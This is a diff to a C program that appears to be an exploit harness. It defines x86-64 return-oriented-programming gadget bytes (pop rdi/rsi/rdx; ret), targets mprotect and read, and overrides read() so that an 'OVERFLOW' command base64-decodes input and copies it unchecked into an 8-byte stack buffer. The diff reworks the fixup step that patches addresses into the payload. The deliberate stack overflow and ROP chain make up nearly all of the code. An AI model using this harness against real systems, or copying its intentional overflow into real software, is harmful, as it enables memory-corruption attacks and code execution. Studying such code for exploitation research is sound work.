@@ -137,16 +137,15 @@ static const char *s_magic = "xyzzy";
 
 static const char *s_makeload = "MAKELOAD";
 static const char *s_dumpload = "DUMPLOAD";
-static const char *s_dofixups = "DOFIXUPS";
 static const char *s_testload = "TESTLOAD";
 static const char *s_overflow = "OVERFLOW";
 
-static const char *s_libc_base     = "base";
-static const char  s_libc_popRDI[] = {0x5f, 0xc3, 0};
-static const char  s_libc_popRSI[] = {0x5e, 0xc3, 0};
-static const char  s_libc_popRDX[] = {0x5a, 0xc3, 0};
-static const char *s_libc_mprotect = "mprotect";
-static const char *s_libc_read     = "read";
+static const char s_libc_base[]     = "base";
+static const char s_libc_popRDI[]   = {0x5f, 0xc3, 0};
+static const char s_libc_popRSI[]   = {0x5e, 0xc3, 0};
+static const char s_libc_popRDX[]   = {0x5a, 0xc3, 0};
+static const char s_libc_mprotect[] = "mprotect";
+static const char s_libc_read[]     = "read";
 
 static Payload payload = {
 	.pl_scu = {
@@ -386,29 +385,19 @@ static void dumpload(PayloadPtr plp) {
 	fprintf(stderr, "--------------------------------------------\n");
 } // dumpload()
 
-static void dofixups(Pointer p, size_t n) {
-	char dst[8] = {0};
-
-	// This should wind up being the same address as it is in overflow()
-	buffer_base = &dst;
-
-	// Perform fixups on anything in range, on 8 byte boundaries, that contains a valid fixup signature
+static void dofixups(Pointer p, size_t n, Pointer selfBase) {
+	buffer_base = selfBase;
 	for (AddressUnionPtr aup = (AddressUnionPtr)p; aup < (AddressUnionPtr) (p + n - sizeof(AddressUnionPtr) + 1); aup++)
 		*aup = fixupAddressUnion(*aup);
 } // dofixups()
 
 static void overflow(Pointer p, size_t n) {
-	char dst[8] = {0};
+	char buffer[8] = {0};
 
-	memcpy(dst, p, n);
+	dofixups(p, n, &buffer);
+
+	memcpy(buffer, p, n);
 } // overflow()
-
-static void testload(Pointer p, size_t n) {
-	volatile char dst[8] = {0};
-
-	dofixups(p, n);
-	overflow(p, n);
-} // testload()
 
 ssize_t read(int fd, void *buf, size_t count) {
 	initialize();
@@ -471,14 +460,11 @@ ssize_t read(int fd, void *buf, size_t count) {
 		} // if
 		else if (!strncmp(s_dumpload, p, strlen(s_dumpload)))
 			dumpload(&payload);
-		else if (!strncmp(s_dofixups, p, strlen(s_dofixups)))
-			dofixups((Pointer)&payload, sizeof(payload));
 		else if (!strncmp(s_testload, p, strlen(s_testload)))
-			testload((Pointer)&payload, sizeof(payload));
+			overflow((Pointer)&payload, sizeof(payload));
 		else if (!strncmp(s_overflow, p, strlen(s_overflow))) {
 			unsigned char *s64 = (unsigned char *) (p + strlen(s_overflow));
 			size_t n256 = decode64(s64, length64(s64), (unsigned char *) p, 65535);
-			dofixups(p, n256);
 			overflow(p, n256);
 		} // else if
 	} // if
@@ -507,7 +493,6 @@ int main(int argc, char **argv)
 	initialize();
 	makeload(&payload);
 	dumpload(&payload);
-	testload((Pointer)&payload, sizeof(payload));
-	dumpload(&payload);
+	overflow((Pointer)&payload, sizeof(payload));
 } // main()
 #endif
